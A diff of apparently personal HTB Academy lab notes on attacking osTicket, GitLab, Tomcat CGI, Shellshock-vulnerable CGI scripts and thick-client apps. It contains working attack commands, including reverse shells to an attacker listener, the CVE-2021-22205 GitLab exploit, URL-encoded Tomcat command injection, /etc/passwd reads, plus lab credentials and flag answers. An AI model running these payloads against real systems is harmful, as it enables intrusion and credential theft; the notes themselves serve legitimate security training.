@@ -1,6 +1,6 @@
 # HTB Academy — Attacking Common Applications: Module Notes
 
-**Status:** In progress (Sections 1–15 of 33 complete)
+**Status:** In progress (Sections 1–21 of 33 complete; Section 21 lab incomplete — pick up at x64dbg dump step)
 
 ---
 
@@ -701,3 +701,265 @@ type C:\Users\Administrator\Desktop\flag.txt
 - Version: `18.1.37.13946`
 - Creds: `prtgadmin:Password123`
 - Flag: `WhOs3_m0nit0ring_wH0?` (at `C:\Users\Administrator\Desktop\flag.txt`)
+
+---
+
+## Section 16 — osTicket
+
+### Overview
+osTicket is an open-source support ticketing system (PHP + MySQL). Not heavily CVE-laden — the main attack value is **information disclosure** and **email registration abuse**, not direct exploitation.
+
+### Footprinting
+- Cookie `OSTSESSID` set on visit = osTicket confirmed
+- Footer shows "powered by osTicket" or "Support Ticket System"
+- Nmap only shows Apache/IIS — doesn't fingerprint osTicket directly
+- Staff login panel: `/scp/login.php`
+- Accepts username OR email address for login
+
+### Attack Angle 1 — Email Registration Abuse
+If you can open a ticket, osTicket may assign a temporary internal company email (e.g. `940288@inlanefreight.local`). Use that email to register accounts on other exposed internal services (GitLab, Slack, Mattermost, Bitbucket) that require email verification from a company domain.
+
+### Attack Angle 2 — Credential Reuse / Sensitive Data in Tickets
+1. Find leaked credentials via Dehashed or other OSINT
+2. Try them against the staff portal at `/scp/login.php` — try both username and full email formats
+3. Once in, check **closed tickets** — agents often send passwords, reset credentials, or internal info directly in the ticket thread
+
+### CVE-2020-24881 — SSRF (osTicket 1.14.1)
+SSRF via the ticket creation form — can be used to reach internal resources or port-scan internally.
+
+### Key Gotchas
+- Login accepts email address even if username fails — always try both formats
+- Closed tickets are the goldmine — open tickets may be empty for inactive agents
+- Helpdesk agents routinely send passwords in plaintext through tickets
+- Standard new-joiner passwords found in tickets may work across all new users (password spray opportunity)
+- Address book in osTicket = username/email list for spraying
+
+### Lab Answers
+- Staff login: `kevin@inlanefreight.local` : `Fish1ng_s3ason!`
+- Password sent to Charles Smithson: `Inlane_welcome!`
+
+---
+
+## Section 17 — GitLab: Discovery & Enumeration
+
+### Overview
+GitLab is a self-hosted Git platform (Ruby on Rails + Go + Vue.js). Attack value: public/internal repos with hardcoded secrets, credential reuse, username enumeration, and occasionally direct exploits against older versions.
+
+### Footprinting
+- Browsing to the instance redirects to `/users/sign_in` — GitLab logo confirms the app
+- Version only visible at `/help` when **logged in**
+- Notable exploited versions: 12.9.0, 11.4.7, CE 13.10.3 / 13.9.3 / 13.10.2
+
+### Enumeration Steps
+1. Browse to `/explore` without auth — check for public projects
+2. Check `/explore/snippets` for exposed code snippets
+3. Register an account if open registration is enabled — unlocks internal projects
+4. Browse to `/help` after login to get version number
+5. Dig through all repo files + full commit history for secrets
+
+### Username / Email Enumeration
+- Registration form leaks valid usernames: "Username is already taken"
+- Registration form leaks valid emails: "Email has already been taken"
+- Works even when sign-up is disabled (browse to `/users/sign_up` directly)
+
+### What to Hunt in Repos
+- `.env`, `config/database.yml`, `docker-compose.yml`, `phpunit_*.xml` — DB credentials
+- CI config files (`.gitlab-ci.yml`, `.travis.yml`) — API keys, tokens
+- Commit history — credentials committed and then "fixed" in a later commit remain in history
+- SSH private keys, API keys, hardcoded passwords
+
+### Key Gotchas
+- Commit message "fix X" = the thing before that commit likely had the credential — check the prior commit
+- 2FA is off by default — credential reuse from Dehashed/OSINT applies directly
+- Public repos visible without auth — always check `/explore` first before registering
+- Internal repos only visible after login — register even if you don't expect much
+
+### Lab Answers
+- Target: `gitlab.inlanefreight.local` (same IP as osTicket — APP04)
+- Version: `13.10.2` (from `/help` after logging in)
+- PostgreSQL password: `postgres` (found in `phpunit_pgsql.xml` in the Inlanefreight dev public project)
+
+---
+
+## Section 18 — Attacking GitLab
+
+### Username Enumeration
+Use the Python3 script (Bash version has CRLF/shebang issues on Pwnbox):
+```
+wget https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/main/gitlab_userenum.py
+python3 gitlab_userenum.py --url http://<target>:<port>/ --wordlist <wordlist>
+```
+- `names.txt` only finds common first names — use `xato-net-10-million-usernames.txt` for broader coverage
+- Script works by checking HTTP 200 vs non-200 on `/<username>` profile pages
+- Profile pages follow redirects — `-L` needed if doing it manually with curl
+- Valid users found on lab: `root`, `bob`, `demo`, `public`, `help`
+
+### CVE-2021-22205 — Authenticated RCE (GitLab ≤ 13.10.2)
+ExifTool mishandles metadata in uploaded image files → code execution as `git` user.
+
+**Requirements:** Valid GitLab account (self-registration works if enabled) + `djvulibre-bin` installed
+
+```
+sudo apt install djvulibre-bin -y
+wget https://raw.githubusercontent.com/CsEnox/Gitlab-Exiftool-RCE/main/exploit.py -O gitlab_rce.py
+```
+
+**Attack:**
+```
+nc -lnvp 8443
+python3 gitlab_rce.py -t http://<target>:<port> -u <user> -p <pass> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> 8443 >/tmp/f'
+```
+
+Shell lands as `git` user. Flag is in `~/gitlab-workhorse/`.
+
+### Key Gotchas
+- Default lockout: 10 failed attempts → 10 min lockout (be careful with brute force)
+- 2FA off by default — credential reuse works directly
+- `djvumake` must be installed or the exploit aborts silently with a hint message
+- `names.txt` wordlist misses non-name usernames — always follow up with a larger list
+- Bash enumeration script has CRLF issues from Windows — use the Python3 version
+
+### Lab Answers
+- Valid users found: `root`, `bob`, `demo` (answer), `public`, `help`
+- RCE exploit: CVE-2021-22205 via `gitlab_rce.py` with registered account `pwn:Welcome1!`
+- Shell as: `git@app04`
+- Flag: `s3cure_y0ur_Rep0s!` (at `~/gitlab-workhorse/flag_gitlab.txt`)
+
+---
+
+## Section 19 — Attacking Tomcat CGI (CVE-2019-0232)
+
+### Overview
+CVE-2019-0232 — command injection via Tomcat CGI Servlet on Windows when `enableCmdLineArguments=true`. Affects Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.
+
+### How It Works
+- CGI Servlet passes query string as command-line args to CGI scripts
+- On Windows, `&` is a command separator — appending `&<cmd>` injects a second command
+- Tomcat added a regex filter blocking special chars — bypass with URL encoding
+
+### Attack Steps
+1. Fuzz for CGI scripts (.cmd first, then .bat):
+```
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<target>:8080/cgi/FUZZ.bat
+```
+2. Confirm script works by browsing to it directly
+3. Check env vars to find PATH (usually unset — must hardcode full paths):
+```
+curl "http://<target>:8080/cgi/welcome.bat?&set"
+```
+4. Exploit with URL-encoded payload (bypass regex filter):
+```
+curl "http://<target>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
+```
+`c%3A%5C` = `c:\`, `%5C` = `\`
+
+### Key Gotchas
+- `whoami` alone returns no output — must use full path `c:\windows\system32\whoami.exe`
+- PATH env var is unset in CGI context — always hardcode full Windows paths
+- Tomcat's special character filter blocks `\` and `:` — URL-encode them to bypass
+- Only works on Windows with `enableCmdLineArguments=true`
+
+### Lab Answers
+- Target: `10.129.205.30` (ACADEMY-ACA-FELDSPAR), Tomcat 9.0.17 on port 8080
+- CGI script found: `welcome.bat`
+- Tomcat running as: `feldspar\omen`
+
+---
+
+## Section 20 — Attacking CGI Applications: Shellshock (CVE-2014-6271)
+
+### Overview
+Shellshock is a 2014 vulnerability in Bash (≤ 4.3) where environment variables can carry executable code. When a CGI script runs and Bash processes environment variables (like User-Agent, Referer, etc.), the injected command executes in the web server's context.
+
+### How It Works
+Bash imports functions from environment variables. Vulnerable versions also execute trailing commands after the function definition:
+```
+env y='() { :;}; echo vulnerable' bash -c "echo test"
+```
+CGI passes HTTP headers as env vars → inject payload in User-Agent → Bash executes it.
+
+### Enumeration
+```
+gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+
+### Confirm Vulnerability
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<target>/cgi-bin/<script>.cgi
+```
+Two `echo` statements before the command ensure output appears after headers.
+
+### Read Files Directly (no shell needed)
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /path/to/file' bash -s :'' http://<target>/cgi-bin/<script>.cgi
+```
+
+### Find Flag Location
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/find / -name flag.txt 2>/dev/null' bash -s :'' http://<target>/cgi-bin/<script>.cgi
+```
+
+### Reverse Shell
+```
+nc -lvnp 7777
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/7777 0>&1' http://<target>/cgi-bin/<script>.cgi
+```
+
+### Key Gotchas
+- Need two `echo` statements before command to flush headers and produce visible output
+- Flag may not be in `/flag.txt` — use `find` to locate it first
+- Shell runs as `www-data` typically
+- Common on IoT devices and legacy embedded systems — always check `/cgi-bin/` when you see CGI
+
+### Lab Answers
+- Target: `10.129.205.27` (ACADEMY-ACA-LOUSY)
+- CGI script: `/cgi-bin/access.cgi` (found via gobuster)
+- Flag location: `/usr/lib/cgi-bin/flag.txt`
+- Flag: `Sh3ll_Sh0cK_123`
+
+---
+
+## Section 21 — Attacking Thick Client Applications
+
+### Overview
+Thick client apps run locally (not in browser). Attack surface includes hardcoded credentials, DLL hijacking, memory analysis, SQL injection, insecure storage, and improper error handling. Key distinction: two-tier (app talks directly to DB) vs three-tier (app → app server → DB).
+
+### Tools
+| Tool | Purpose |
+|---|---|
+| ProcMon64 | Monitor file/registry/network activity during execution |
+| x64dbg | Dynamic analysis and memory dumping |
+| de4dot | Deobfuscate/decompile .NET executables |
+| dnSpy | Read decompiled .NET source code |
+| Strings / strings64.exe | Extract strings from binaries |
+| CFF Explorer / Detect It Easy | Static analysis / file format identification |
+
+### Attack Methodology — Extracting Hardcoded Credentials
+1. **Find the app** — check SMB shares (NETLOGON), installed programs, etc.
+2. **Run with ProcMon** — monitor for temp files written during execution
+3. **Block temp deletion** — remove Delete permissions from Temp folder so dropped files persist:
+   - Right-click Temp → Properties → Security → Advanced → Disable inheritance → Convert → Edit → uncheck "Delete subfolders and files" and "Delete"
+4. **Run the exe again** — capture the dropped batch file in `%TEMP%\2\`
+5. **Edit the batch file** — remove `del` commands at the bottom so intermediate files survive
+6. **Run modified batch** — produces `oracle.txt` (base64) and `monta.ps1`
+7. **Run monta.ps1** to decode oracle.txt → `restart-service.exe`
+   - If `powershell.exe` from cmd fails with InitialSessionState error, open PowerShell directly from Start menu and run `& C:\ProgramData\monta.ps1`
+8. **Open in x64dbg** — Options → Preferences → uncheck all except Exit Breakpoint → File → Open
+9. **Memory Map** — right-click CPU → Follow in Memory Map → find entry: Type=MAP, Size=3000, Protection=-RW--
+10. **Dump** — right-click that entry → Dump Memory to File → save .bin
+11. **de4dot** — drag .bin onto de4dot.exe → produces `-cleaned.bin`
+12. **dnSpy** — drag `-cleaned.bin` onto dnSpy → read source code for hardcoded credentials
+
+### Key Gotchas
+- PowerShell invoked from cmd may fail with `InitialSessionState` error — open PowerShell directly from Start menu instead
+- Temp folder permissions must be changed BEFORE running the exe — not after
+- The MAP entry with size 3000 and -RW-- is the embedded .NET executable mapped into memory
+- de4dot output is `-cleaned.bin` — drag this (not the original) into dnSpy
+- x64dbg memory map auto-scrolls — click to select the row first, then right-click to dump
+- Batch file generates randomly named files each run — check `%TEMP%\2\` after each run
+
+### Lab Status
+- Target: `10.129.228.115` (ACADEMY-ACA-PIVOTAPI) — RDP as `cybervaca:&aue%C)}6g-d{w`
+- Extracted `restart-service.exe` from oracle.txt via monta.ps1 — located at `C:\ProgramData\restart-service.exe`
+- **Stopped at:** x64dbg memory map dump step — MAP entry (Type=MAP, Size=3000, -RW--) identified but not yet dumped
+- **Resume:** Open x64dbg → load `C:\ProgramData\restart-service.exe` → Memory Map → find MAP/3000/-RW-- entry → click to select → right-click → Dump Memory to File → de4dot → dnSpy → find credentials
